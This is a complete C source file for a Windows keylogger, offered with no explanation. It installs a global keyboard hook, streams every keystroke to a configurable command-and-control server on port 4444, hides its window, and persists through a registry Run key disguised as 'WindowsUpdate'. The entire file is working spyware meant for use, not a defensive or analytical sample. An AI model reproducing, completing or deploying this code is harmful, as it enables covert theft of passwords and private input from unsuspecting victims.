#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#define C2_HOST "your-vps-ip.com"  // CHANGE THIS
#define C2_PORT 4444

HHOOK g_hKeyboardHook = NULL;
SOCKET g_sock = INVALID_SOCKET;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKbStruct->vkCode;
        
        BYTE keyboardState[256] = {0};
        GetKeyboardState(keyboardState);
        
        WCHAR buffer[2] = {0};
        int result = ToUnicode(vkCode, pKbStruct->scanCode, keyboardState, buffer, 2, 0);
        
        if (result > 0) {
            char utf8[8] = {0};
            int len = WideCharToMultiByte(CP_UTF8, 0, buffer, 1, utf8, sizeof(utf8), NULL, NULL);
            if (g_sock != INVALID_SOCKET && len > 0) {
                send(g_sock, utf8, len, 0);
            }
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI C2ConnectThread(LPVOID lpParam) {
    while (1) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
        
        g_sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server = {0};
        server.sin_family = AF_INET;
        server.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_HOST, &server.sin_addr);
        
        if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            break;
        }
        closesocket(g_sock);
        Sleep(5000);
        WSACleanup();
    }
    return 0;
}

void InstallPersistence() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        
        RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, 
                      (BYTE*)path, strlen(path));
        RegCloseKey(hKey);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    // Hide window completely
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    
    // Install persistence
    InstallPersistence();
    
    // Global keyboard hook
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 
                                      GetModuleHandle(NULL), 0);
    
    // Connect to C2
    CreateThread(NULL, 0, C2ConnectThread, NULL, 0, NULL);
    
    // Message loop (keeps service alive)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(g_hKeyboardHook);
    if (g_sock != INVALID_SOCKET) closesocket(g_sock);
    return 0;
}
